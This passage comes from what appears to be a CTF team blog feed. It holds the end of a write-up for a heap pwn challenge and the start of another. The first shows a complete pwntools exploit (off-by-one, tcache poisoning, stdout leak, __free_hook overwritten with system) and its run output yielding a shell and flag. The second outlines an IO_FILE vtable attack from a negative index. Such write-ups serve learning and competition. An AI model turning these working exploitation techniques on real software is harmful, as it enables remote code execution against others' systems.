class="number">0x7</span>, <span class="keyword">True</span>) <span class="comment"># trigger shell</span></span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"binary.utctf.live"</span>, <span class="string">"9050"</span></span><br><span class="line">filename = <span class="string">"./pwnable"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"r"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, name, length, description, stdoutFuckedUp=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> stdoutFuckedUp:</span><br><span class="line">        r.sendlineafter(<span class="string">'Cancel Person\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'\n&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Name:'</span>, name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Length of description: '</span>, str(length))</span><br><span class="line">    r.sendafter(<span class="string">'Description: '</span>, description)</span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index, stdoutFuckedUp=False)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> stdoutFuckedUp:</span><br><span class="line">        r.sendlineafter(<span class="string">'Cancel Person\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'\n&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span><span class="comment"># </span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = getConn()</span><br><span class="line">        add(<span class="number">0x0</span>, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">0x8</span>)</span><br><span class="line">        add(<span class="number">0x1</span>, <span class="string">'B'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'B'</span>*<span class="number">0x8</span>)</span><br><span class="line">        add(<span class="number">0x2</span>, <span class="string">'C'</span>*<span class="number">8</span>, <span class="number">0x70</span>, <span class="string">b'C'</span>*<span class="number">96</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">        add(<span class="number">0x3</span>, <span class="string">'D'</span>*<span class="number">8</span>, <span class="number">0x21</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x1</span>))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x4</span>+x, <span class="string">'E'</span>*<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">'E'</span>*<span class="number">8</span>) <span class="comment"># Create 0x90 chunks to later fill tcache[0x90]</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            free(<span class="number">0x4</span>+x) <span class="comment"># Fill tcache[0x90]</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0xCC8</span>,<span class="number">0xBC7</span>])</span><br><span class="line">        </span><br><span class="line">        free(<span class="number">0</span>) <span class="comment"># Insert chunk A into tcache[0x20]</span></span><br><span class="line">        add(<span class="number">0x0</span>, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">0x18</span>+<span class="string">'\x91'</span>) <span class="comment"># Overflow B size to 0x91</span></span><br><span class="line">        free(<span class="number">1</span>) <span class="comment"># Goes to the unsorted bin because tcache[0x20] is full</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0xa</span>+x, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">'A'</span>*<span class="number">0x10</span>) <span class="comment"># clean tcache[0x90]</span></span><br><span class="line">        </span><br><span class="line">        free(<span class="number">0x2</span>) <span class="comment"># send this to tcache[0x80]</span></span><br><span class="line">        add(<span class="number">0x11</span>, <span class="string">'A'</span>*<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">'A'</span>*<span class="number">0x2</span>) <span class="comment"># put a libc address at next pointer from tcache[0x80]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#if args.REMOTE:</span></span><br><span class="line">        add(<span class="number">0x12</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x20</span>, <span class="string">'\x60\xa7'</span>) <span class="comment"># STDOUT, trying a 4bit bruteforce</span></span><br><span class="line">        <span class="comment">#else:</span></span><br><span class="line">        <span class="comment">#    add(0x12, 'B'*8, 0x20, '\x60\x07\xdd') # echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#r.interactive()</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x13</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x70</span>, <span class="string">'A'</span>) <span class="comment"># head of tcache[0x80]</span></span><br><span class="line">        free(<span class="number">0x13</span>) <span class="comment"># to make tcache[0x80] counter positive</span></span><br><span class="line">        add(<span class="number">0x14</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x70</span>, p64(<span class="number">0x0fbad1800</span>)+ <span class="number">3</span>*p64(<span class="number">0</span>) + <span class="string">b'\x00'</span>) <span class="comment"># overwrite stdout to get a leak</span></span><br><span class="line">        <span class="keyword">if</span> r.recv(<span class="number">4</span>) == <span class="string">b'Menu'</span>: <span class="comment"># first check to see if the leak happened</span></span><br><span class="line">            log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        LEAK = u64(r.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">        LIBC = LEAK<span class="number">-0x3ed8b0</span></span><br><span class="line">        <span class="keyword">if</span> LIBC &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span> <span class="keyword">or</span> LIBC &amp; <span class="number">0xFFF</span> != <span class="number">0</span>: <span class="comment"># 2nd check to make sure</span></span><br><span class="line">            log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        FREE_HOOK = LIBC + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">        SYSTEM = LIBC + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">        log.info(<span class="string">'LEAK 0x%x'</span> % LEAK)</span><br><span class="line">        log.info(<span class="string">'LIBC 0x%x'</span> % LIBC)</span><br><span class="line"></span><br><span class="line">        free(<span class="number">0xa</span>+<span class="number">6</span>, <span class="keyword">True</span>) <span class="comment"># free chunk after old chunk B</span></span><br><span class="line">        add(<span class="number">0xa</span>+<span class="number">6</span>, <span class="string">'K'</span>*<span class="number">8</span>, <span class="number">0x80</span>, p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x70</span>), <span class="keyword">True</span>) <span class="comment"># create a fake chunk inside so we can increase the size of chunk B</span></span><br><span class="line">        add(<span class="number">0x0</span>,<span class="string">'B'</span>*<span class="number">8</span>,<span class="number">0x28</span>, <span class="string">'A'</span>*<span class="number">0x28</span>+<span class="string">'\xa1'</span>, <span class="keyword">True</span>) <span class="comment"># change size of chunk B to 0xa1</span></span><br><span class="line">        free(<span class="number">0xa</span>+<span class="number">6</span>,<span class="keyword">True</span>) <span class="comment"># free chunk after chunk B again</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x0</span>, <span class="string">'L'</span>*<span class="number">8</span>, <span class="number">0x90</span>, <span class="string">b'L'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(FREE_HOOK), <span class="keyword">True</span>) <span class="comment"># Overlapping chunk</span></span><br><span class="line">        add(<span class="number">0x7</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="number">0x80</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="keyword">True</span>) <span class="comment"># prepare the first argument of system</span></span><br><span class="line">        add(<span class="number">0x13</span>, <span class="string">b'/bin/sh\x00'</span>, <span class="number">0x80</span>, p64(SYSTEM), <span class="keyword">True</span>) <span class="comment"># update free_hook contents to system</span></span><br><span class="line">        free(<span class="number">0x7</span>, <span class="keyword">True</span>) <span class="comment"># trigger shell</span></span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">$ python3 cancelled.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/cancelled/pwnable'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/cancelled/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[-] not lucky enough!</span><br><span class="line">[*] Closed connection to binary.utctf.live port 9050</span><br><span class="line">[+] Opening connection to binary.utctf.live on port 9050: Done</span><br><span class="line">[*] LEAK 0x7f2ddf97b8b0</span><br><span class="line">[*] LIBC 0x7f2ddf58e000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">/bin/sh is cancelled.</span><br><span class="line">$ ll</span><br><span class="line">$ ls</span><br><span class="line">flag.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">utflag&#123;j1tt3rbUg_iS_Canc3l1ed_:(&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/chunk_extend_overlapping/</a></li><li><a href="https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2018-writeup/hitcon/baby_tcache.py</a></li><li><a href="https://vigneshsrao.github.io/babytcache/" target="_blank" rel="noopener">https://vigneshsrao.github.io/babytcache/</a></li><li><a href="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/">https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/</a></li><li><a href="https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/">https://teamrocketist.github.io/2019/08/17/Pwn-RedpwnCTF-penpal-world/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Cancelled&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;1879pts&lt;/p&gt;
&lt;p&gt;Solvers 26&lt;/p&gt;
&lt;p&gt;We should canc
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Off By One" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Off-By-One/"/>
    
      <category term="Tcache" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/"/>
    
      <category term="IO_FILE" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"/>
    
      <category term="tcache_poisoning" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Tcache/tcache-poisoning/"/>
    
    
      <category term="file_stream" scheme="https://teamrocketist.github.io/tags/file-stream/"/>
    
      <category term="io_file" scheme="https://teamrocketist.github.io/tags/io-file/"/>
    
      <category term="io_file_struct" scheme="https://teamrocketist.github.io/tags/io-file-struct/"/>
    
      <category term="heap" scheme="https://teamrocketist.github.io/tags/heap/"/>
    
      <category term="off_by_one" scheme="https://teamrocketist.github.io/tags/off-by-one/"/>
    
      <category term="tcache" scheme="https://teamrocketist.github.io/tags/tcache/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Aero 2020 - Plane Market</title>
    <link href="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/"/>
    <id>https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/</id>
    <published>2020-03-01T15:57:25.000Z</published>
    <updated>2022-08-23T00:14:55.165Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Plane Market</p></blockquote><blockquote><p><strong>Description</strong>:<br>416pts</p><p>Solvers ???</p><p>…</p><p><a href="https://mega.nz/#!C3QEFCoZ!ONfLr_1ZJ-r23-a6OEAthOo97s8423_2QZwvmOymDg8" target="_blank" rel="noopener">plane_market</a> c8052c64cf194d22ca42f0ef4fa6ffc8<br><a href="https://mega.nz/#!m3ZAUQrT!s7ky9fVJZB_r6_o1fQGcjOjCxpYeGu6xvIpSnPrSLks" target="_blank" rel="noopener">libc.so.6</a> 5f4f99671c3a200f7789dbb5307b04bb<br><a href="https://mega.nz/#!SvJizK7A!6roskSJNi163oaq7_Zs_ZWfe1bDLOYYDQzJ0Rh5mV50" target="_blank" rel="noopener">ld-linux-x86-64.so.2</a> 63d339810fe3d20a86e3ff2237e46d89</p><p>nc ctf.pragyan.org 17000</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Use a negative index to change <strong>_IO_2_1_STDOUT_</strong> and execute <strong>IO_OVERFLOW</strong>.</li><li>Next <strong>puts</strong> will leak a libc address.</li><li>Repeat 1st step but now change flags field to “/bin/sh\x00” and the <strong>vtable</strong> to <strong>IO_helper_jumps</strong>.</li><li>Change <strong>IO_helper_jumps</strong> IO_OVERFLOW pointer to system.</li><li>Next puts/printf will execute IO_OVEFLOW (fp, EOF) which is now system(fp=/bin/sh).</li></ul><h3 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h3><p>I feel like I ended up using an unintended solution, this binary had a lot more options but I ended up only using the <strong>change_plane_name</strong> function. In the end my solution is based in exploiting the <strong>IO_FILE_STRUCTURE</strong>, by abusing a negative index that allow us to modify <strong>STDOUT</strong>.</p><h3 id="Preparing-the-binary-to-LD-PRELOAD"><a href="#Preparing-the-binary-to-LD-PRELOAD" class="headerlink" title="Preparing the binary to LD_PRELOAD"></a>Preparing the binary to LD_PRELOAD</h3><p>To preload this binary we need to use <strong>patchelf</strong> to use the <strong>ld</strong> given by the challenge:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp plane_market plane_marketbkup</span><br><span class="line">$ patchelf --<span class="built_in">set</span>-interpreter ld-linux-x86-64.so.2 ./plane_marketbkup</span><br></pre></td></tr></table></figure></p><p>Now preloading in the terminal:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libc.so.6 ./plane_marketbkup</span><br><span class="line">&#123;?&#125; Enter name: lol</span><br><span class="line">-------- Plane market --------</span><br><span class="line">1. Sell plane</span><br><span class="line">2. Delete plane</span><br><span class="line">3. View sales list</span><br><span class="line">4. View plane</span><br><span class="line">5. Change plane name</span><br><span class="line">6. View profile</span><br><span class="line">7. Exit</span><br><span class="line">&gt; 7</span><br></pre></td></tr></table></figure></p><p>Preloading with pwntools:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r=process(filename, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br></pre></td></tr></table></figure></p><h3 id="Binary-analysis"><a href="#Binary-analysis" class="headerlink" title="Binary analysis"></a>Binary analysis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file plane_market</span><br><span class="line">plane_market: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3a51921137c51149f99313e174755aeb4d8670fc, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec plane_market</span><br><span class="line">[*] <span class="string">'/ctf/aero2020ctf/pwn/PlaneMarket/plane_market'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Static-analysis"><a href="#Static-analysis" class="headerlink" title="Static analysis"></a>Static analysis</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">change_plane_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter plane id: "</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == last_plane_id )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">      result = read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = qword_404108[<span class="number">6</span> * v1];</span><br><span class="line">      <span class="keyword">if</span> ( !result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&#123;?&#125; Enter new plane name: "</span>);</span><br><span class="line">        read_buf(*((<span class="keyword">void</span> **)&amp;plane_list + <span class="number">6</span> * v1), *((_QWORD *)&amp;unk_404100 + <span class="number">6</span> * v1));</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1;</span><br><span class="line">        last_plane_id = v1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"&#123;-&#125; Error id!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The vulnerability is here, there isn’t a check for negative indexes.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>By editing the <strong>-2</strong> index things will be aligned with the <strong>stdout</strong> and <strong>stderr</strong> pointers in the BSS. </p><p>In the end the size filed of “<strong>read</strong>“ will be part of the stderr pointer and the pointer of <strong>stdout</strong> will be the <strong>buf</strong> to be edited:<br><a data-fancybox="gallery" href="https://i.imgur.com/BHVaAKq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BHVaAKq.png" alt><br></a></p><p>The first edit is to make <strong>printf/puts</strong> to leak a libc address the way we can do this is by changing the <strong>STDOUT</strong> file structure to meet this conditions:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 